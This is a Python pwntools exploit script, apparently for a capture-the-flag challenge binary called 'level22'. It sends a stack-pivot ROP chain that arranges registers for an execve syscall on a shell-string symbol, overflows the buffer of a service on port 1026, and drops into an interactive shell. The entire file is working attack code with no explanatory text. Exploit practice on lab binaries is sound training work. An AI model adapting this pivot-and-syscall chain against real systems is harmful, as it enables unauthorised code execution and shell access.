#!/usr/bin/python3
from pwn import *

context.update(os = 'linux', arch = 'i386')

elf = ELF("./level22")

DEBUG = 0
REMOTE = 1

if DEBUG or args.GDB or args.gdb and not args.REMOTE and not args.remote and not REMOTE: 
    gs = f'''
    b *main + 43
    b main
    continue
    '''
    r = gdb.debug(elf.path,gdbscript=gs)

elif args.REMOTE or args.remote or REMOTE:
    r = remote("0.0.0.0",1026)
else:
    r = process(elf.path)


offset = 4
stack = elf.sym.stack 
bin_sh = elf.sym.idk 
pivot_gadget = elf.sym.gadgets 
eax_gadget = elf.sym.win 
ebx_gadget = eax_gadget + 6
ecx_gadget = eax_gadget + 8 
edx_gadget = eax_gadget + 10
syscall = eax_gadget + 12 


stack_payload = p32(eax_gadget) + p32(ebx_gadget) + p32(bin_sh) + p32(ecx_gadget) + p32(0) + p32(edx_gadget) + p32(0) + p32(syscall)
overflow_payload = cyclic(offset) + p32(pivot_gadget) + p32(stack)

raw_input("send stack payload?")
r.sendline(stack_payload)
raw_input("send overflow payload?")
r.sendline(overflow_payload)

log.progress("pwned!")
r.interactive()